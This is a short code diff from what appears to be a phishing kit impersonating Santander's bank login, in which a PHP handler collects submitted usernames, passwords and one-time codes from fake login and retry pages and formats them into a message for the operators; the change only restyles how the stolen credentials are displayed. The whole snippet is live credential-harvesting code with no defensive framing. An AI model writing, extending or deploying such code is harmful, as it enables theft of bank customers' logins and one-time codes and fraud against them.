@@ -43,8 +43,8 @@ if (isset($_POST['usr'], $_POST['pass'])) {
     $user = trim($_POST['usr']);
     $password = trim($_POST['pass']);
     $message .= "💥『𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋 𝖫𝗈𝗀𝗈』💥\n\n";
-    $message .= "┇ﾒ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: $user\n";
-    $message .= "┇ﾒ 𝖢𝗅𝖺𝗏𝖾.: $password\n\n";
+    $message .= "┇ﾒ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:   <code>$user<code>\n";
+    $message .= "┇ﾒ 𝖢𝗅𝖺𝗏𝖾.:   <code>$password<code>\n\n";
 
 // index-error.php
 } elseif (isset($_POST['usr2'], $_POST['pass2'])) {
@@ -54,8 +54,8 @@ if (isset($_POST['usr'], $_POST['pass'])) {
     $user = trim($_POST['usr2']);
     $password = trim($_POST['pass2']);
     $message .= "💥『𝖲𝖺𝗇𝗍𝖺𝗇𝖽𝖾𝗋 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』💥\n\n";
-    $message .= "┇ﾒ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: $user\n";
-    $message .= "┇ﾒ 𝖢𝗅𝖺𝗏𝖾.: $password\n\n";
+    $message .= "┇ﾒ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.:   <code>$user<code>\n";
+    $message .= "┇ﾒ 𝖢𝗅𝖺𝗏𝖾.:   <code>$password<code>\n\n";
 
 // otp.php
 } elseif (isset($_POST['otp'])) {
